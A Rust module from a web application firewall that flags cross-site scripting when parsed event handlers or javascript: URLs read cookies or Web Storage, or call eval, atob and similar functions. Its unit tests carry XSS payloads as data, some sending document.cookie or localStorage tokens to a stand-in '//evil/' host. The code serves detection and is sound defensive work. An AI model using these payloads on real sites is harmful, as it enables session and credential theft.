//! Lane 2 XSS JS-token semantic detector (plan §5.4, P-XSS-2).
//!
//! The **second** detector in the `Xss` attack family, alongside
//! [`super::xss_dom::XssDomDetector`]. It mirrors the `SQLi` two-detector paradigm
//! (structural [`super::detectors::StructuralSqlDetector`] + AST
//! [`super::detectors::AstSqlDetector`], weighted 0.5/0.5): the DOM detector
//! decides "does this parse into an **active element / attribute** with a
//! dangerous structure", and this detector decides "does the JS that would run in
//! that context perform an **attack-specific** action — credential/storage theft,
//! obfuscation decode, or dynamic code execution".
//!
//! The two detectors are only genuinely independent evidence when the JS token is
//! attack-specific. A real inline handler almost always contains *real* JS (an
//! AJAX call, a navigation, a DOM write), so "has a handler structure" (`xss_dom`)
//! and "the handler value is JS" are correlated on legitimate traffic — they do
//! **not** corroborate independently. That is exactly why the token tables below
//! are deliberately narrow: they match only verbs a benign handler has no reason
//! to use (reading `document.cookie`, `eval`, `atob`), and drop the plain JS
//! (`fetch(`, `setTimeout`, `location.href`, `.src=`, `innerHTML`) that any
//! ordinary handler carries. Only then does an `xss_js` hit mean "this JS is doing
//! something attackish", not merely "this is JS", restoring independence from
//! `xss_dom`.
//!
//! It is deliberately a **token layer**, not a JS AST (that is a far-future step):
//! it never parses HTML or JS itself. The DOM detector already HTML-parses each
//! view exactly once and, in that single walk, extracts the JS **execution
//! contexts** — the values of `on*=` event-handler attributes and the script
//! bodies of `javascript:` / `vbscript:` URLs — into [`ContentInspectionState`]
//! (see [`super::xss_dom`]). This detector, registered immediately after it,
//! drains those contexts and scans them for dangerous JS tokens. Because the
//! contexts come only from **genuinely-parsed** attributes:
//!
//! * `eval` / `document.cookie` sitting in ordinary JS prose or a text node
//!   (`element.onerror = function(){ eval(x) }`) is never extracted, so it never
//!   fires — the classic false positive of a naive `on*=`/`javascript:` regex;
//! * `<textarea>` / `<template>` **inert** content is never parsed into an
//!   attribute, so a handler-looking string inside it is invisible here too.
//!
//! **Corroboration raises the Block bar; single detector → Log.** With the family
//! weighted `xss_dom = 0.5 / xss_js = 0.5` (`configs/default.toml`), a lone hit
//! from either detector scores `0.5 × confidence` (≈ 40–45) — above the Log
//! threshold (40), below the Block threshold (80). Only when **both** fire on the
//! same field (`<img onerror=eval(document.cookie)>` → DOM `xss.event_handler` +
//! JS `xss.js_exfil`) does the sum reach Block. This is a higher **Block bar**,
//! not an independent-evidence guarantee for mainstream XSS (see the note above:
//! on legitimate inbound HTML the two signals are correlated). The discrimination
//! that keeps a benign `onclick="fetch('/api')"` at DOM-only Log comes from the
//! narrow token tables, not from the two signals being independent. Everything
//! here is **shadow only** (`log_only` downgrades any Block recommendation to Log)
//! and the Block bar still needs holdout calibration on real traffic before it is
//! ever wired to enforcement.

use std::borrow::Cow;

use super::budget::ContentInspectionState;
use super::preprocess::{PreprocessCtx, SemanticDetector, View};
use super::types::{AttackKind, DetectionFinding, DetectorId};

/// Credential / storage exfiltration tokens — the higher-confidence class
/// (`xss.js_exfil`, conf 88). Each names an **attack-specific** action a benign
/// inline handler has no reason to perform: reading the document cookie, relaxing
/// `document.domain`, or dredging Web Storage for credentials. Deliberately narrow
/// — the bare navigation/telemetry tokens a legitimate handler routinely carries
/// (`fetch(`, `xmlhttprequest`, `sendbeacon`, `location.*`, `.src=`, `new image`)
/// are **not** here: they are evidence of "this is JS", not of an attack, and
/// keeping them would make `xss_js` fire on every real handler and so lose its
/// independence from `xss_dom`. Authored lowercase; matched against the lowercased
/// context. Each token is dotted so it cannot match a bare English word
/// (`document.cookie` is unambiguous).
const EXFIL_TOKENS: &[&str] = &["document.cookie", "document.domain", "localstorage", "sessionstorage"];

/// Dynamic-execution / obfuscation-decode tokens — the sink class
/// (`xss.js_sink`, conf 85). Again **attack-specific**: running attacker-supplied
/// code (`eval(` / `execScript` / dynamic `import(`) or decoding an obfuscated
/// payload (`atob(` / `String.fromCharCode` / `unescape(`). The plain DOM-write
/// sinks (`innerHTML=` / `document.write(` / `outerHTML`), the benign timers
/// (`setTimeout` / `setInterval`) and the dialog calls (`alert(` / `prompt(` /
/// `confirm(`) were dropped: an ordinary handler updates markup, sets a timer or
/// pops a dialog, so those are not independent evidence of an attack. Authored
/// lowercase; each token is call- or dot-shaped.
const SINK_TOKENS: &[&str] = &[
    "eval(",
    "execscript",
    "import(",
    "atob(",
    "string.fromcharcode",
    "unescape(",
];

/// Classify one JS execution context into its strongest dangerous class, or
/// `None`. Exfiltration outranks a plain sink (data theft is the worse outcome).
fn classify_context(lower: &str) -> Option<(&'static str, u8)> {
    if EXFIL_TOKENS.iter().any(|t| lower.contains(t)) {
        Some(("xss.js_exfil", 88))
    } else if SINK_TOKENS.iter().any(|t| lower.contains(t)) {
        Some(("xss.js_sink", 85))
    } else {
        None
    }
}

/// Lightweight JS-token XSS detector (plan §5.4, P-XSS-2).
///
/// Registered in the `Xss` attack family right after
/// [`super::xss_dom::XssDomDetector`], whose single HTML parse feeds it the JS
/// execution contexts to classify.
pub struct XssJsTokenDetector {
    _private: (),
}

impl XssJsTokenDetector {
    #[must_use]
    pub const fn new() -> Self {
        Self { _private: () }
    }
}

impl Default for XssJsTokenDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for XssJsTokenDetector {
    fn id(&self) -> DetectorId {
        DetectorId::XssJs
    }

    fn detect(
        &self,
        _view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        // The DOM detector runs first (registration order) and stashes the JS
        // execution contexts it extracted from THIS view; drain them. Empty ⇒ no
        // parsed handler/js-url context on this view ⇒ nothing to corroborate.
        let contexts = state.take_xss_js_contexts();
        let mut best: Option<(&'static str, u8)> = None;
        for ctx in &contexts {
            let lower = ctx.to_ascii_lowercase();
            if let Some(cand) = classify_context(&lower)
                && best.is_none_or(|b| cand.1 > b.1)
            {
                best = Some(cand);
            }
        }
        let (rule_key, confidence) = best?;
        Some(DetectionFinding {
            attack: AttackKind::Xss,
            confidence,
            rule_key,
            detail: Cow::Owned(format!(
                "xss js token '{rule_key}' matched in a parsed handler/js-url context (confidence {confidence})"
            )),
        })
    }
}

#[cfg(test)]
mod tests {
    use std::borrow::Cow;
    use std::collections::HashMap;
    use std::sync::Arc;

    use bytes::Bytes;
    use waf_common::{HostConfig, RequestCtx};

    use super::*;
    use crate::checks::content_security::types::{InspectionScope, Provenance};
    use crate::checks::content_security::xss_dom::XssDomDetector;

    fn view(text: &str) -> View<'static> {
        View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Owned(text.to_string()),
            lower_trunc: text.to_ascii_lowercase(),
            provenance: Provenance::Raw,
        }
    }

    fn throwaway_req() -> RequestCtx {
        RequestCtx {
            req_id: "t".to_string(),
            client_ip: "127.0.0.1".parse().expect("ip"),
            client_port: 0,
            method: "GET".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length: 0,
            is_tls: false,
            host_config: Arc::new(HostConfig::default()),
            geo: None,
        }
    }

    /// Run the REAL detector pair on one text: the DOM detector populates the JS
    /// contexts, then the token detector classifies them — exactly the production
    /// registration-order coupling.
    fn js_fire(text: &str) -> Option<DetectionFinding> {
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        let v = view(text);
        // DOM detector first: it stashes the extracted JS contexts into `st`.
        let _ = XssDomDetector::new().detect(&v, &pctx, &mut st);
        XssJsTokenDetector::new().detect(&v, &pctx, &mut st)
    }

    // ── Positive: a dangerous JS token in a parsed handler / js-url fires ───────

    #[test]
    fn sink_token_in_event_handler_fires() {
        // Each value performs an attack-specific action — dynamic execution or an
        // obfuscation decode — that no benign handler carries.
        for (payload, key) in [
            ("<img src=x onerror=eval(atob('YQ=='))>", "xss.js_sink"),
            ("<div onclick=\"unescape('%61')\">y</div>", "xss.js_sink"),
            ("<svg onload=String.fromCharCode(88)>", "xss.js_sink"),
            ("<body onload=\"eval(name)\">", "xss.js_sink"),
        ] {
            let f = js_fire(payload).unwrap_or_else(|| panic!("must fire: {payload:?}"));
            assert_eq!(f.rule_key, key, "payload {payload:?}");
            assert_eq!(f.attack, AttackKind::Xss);
            assert_eq!(f.confidence, 85);
        }
    }

    #[test]
    fn exfil_token_outranks_sink_and_fires() {
        // All three read credentials/storage (the exfil class) — the first also
        // `eval`s (a sink), proving exfil outranks a co-present sink.
        for payload in [
            "<img src=x onerror=\"eval(document.cookie)\">",
            "<a href=\"javascript:new Image().src='//evil/?'+document.cookie\">x</a>",
            "<div onmouseover=\"location.href='//evil/'+localStorage.token\">y</div>",
        ] {
            let f = js_fire(payload).unwrap_or_else(|| panic!("must fire: {payload:?}"));
            assert_eq!(f.rule_key, "xss.js_exfil", "exfil outranks sink: {payload:?}");
            assert_eq!(f.confidence, 88);
        }
    }

    #[test]
    fn dangerous_token_in_javascript_url_body_fires() {
        // The js-url script body (case preserved) carries the token.
        let f = js_fire("<a href=\"javascript:eval(atob('Zm9v'))\">x</a>").expect("js-url sink fires");
        assert_eq!(f.rule_key, "xss.js_sink");
        // `String.fromCharCode` is case-significant — matched case-insensitively.
        let f2 = js_fire("<a href=\"vbscript:String.fromCharCode(88)\">x</a>").expect("fromCharCode fires");
        assert_eq!(f2.rule_key, "xss.js_sink");
    }

    // ── Corroboration boundary: a benign handler value carries no token → clean ─

    #[test]
    fn benign_handler_value_does_not_fire() {
        // A REAL parsed handler, but its value is a plain, harmless call — no sink
        // or exfil token, so the token detector stays silent (the DOM detector
        // alone would only reach Log).
        for benign in [
            "<button onclick=\"submit()\">go</button>",
            "<form onsubmit=\"return validate(this)\">",
            "<div onmouseover=\"this.classList.add('hot')\">x</div>",
            "<a href=\"javascript:void(0)\">noop</a>",
        ] {
            assert!(
                js_fire(benign).is_none(),
                "benign handler value must be clean: {benign:?}"
            );
        }
    }

    #[test]
    fn legit_inline_handler_with_real_js_does_not_fire() {
        // The narrowing regression (audit MEDIUM #2): these are REAL parsed handlers
        // whose values carry genuine JS — an AJAX call, a pixel preload, a legacy
        // navigation, a benign timer, a widget DOM write. Under the OLD wide token
        // tables (`fetch(`/`.src=`/`location.href`/`setTimeout`/`innerhtml`) each
        // fired `xss_js` and, alongside the `xss_dom` handler structure, corroborated
        // to a Block recommendation on ordinary CMS/rich-text traffic. After the
        // narrowing `xss_js` stays silent — none of these is an attack-specific
        // action — so the field trips `xss_dom` alone (Log), never corroboration.
        for legit in [
            "<button onclick=\"fetch('/api/save')\">go</button>",
            "<img src=x onload=\"new Image().src='/px'\">",
            "<a href=\"javascript:location.href='/home'\">home</a>",
            "<button onclick=\"setTimeout(refresh,1000)\">r</button>",
            "<div onclick=\"this.innerHTML=render()\">x</div>",
        ] {
            assert!(
                js_fire(legit).is_none(),
                "a legitimate real-JS handler must not fire xss_js (independence from xss_dom): {legit:?}"
            );
        }
    }

    // ── Anti-FP: dangerous tokens in NON-attribute contexts never reach us ──────

    #[test]
    fn dangerous_js_in_text_or_prose_does_not_fire() {
        // These contain `eval` / `fetch` / `document.cookie`, but NOT inside a
        // parsed on*/js-url attribute — the DOM detector extracts no context, so we
        // never see them. This is the core anti-FP win over a naive regex.
        for benign in [
            "element.onerror = function(e) { eval(payload) }", // JS prose, no markup
            "<p>Call eval(x) and read document.cookie carefully.</p>", // text node
            "<code>fetch('/api').then(r =&gt; r.json())</code>", // code sample
            "<textarea><img src=x onerror=eval(document.cookie)></textarea>", // inert rawtext
            "<template><img src=x onerror=fetch('//evil')></template>", // inert template
        ] {
            assert!(
                js_fire(benign).is_none(),
                "dangerous JS outside a parsed handler/js-url must be clean: {benign:?}"
            );
        }
    }

    #[test]
    fn no_markup_never_fires() {
        // No tag-open at all → the DOM detector never parses, stashes an empty
        // context set → the token detector is silent.
        for benign in [
            "onload=eval is a config string",
            "the fetch API and document.cookie are web platform features",
        ] {
            assert!(js_fire(benign).is_none(), "non-markup must be clean: {benign:?}");
        }
    }

    #[test]
    fn empty_context_channel_yields_none() {
        // Directly: with nothing stashed, the token detector returns None (it never
        // parses on its own).
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        assert!(
            XssJsTokenDetector::new()
                .detect(&view("<img src=x onerror=eval(1)>"), &pctx, &mut st)
                .is_none()
        );
    }
}
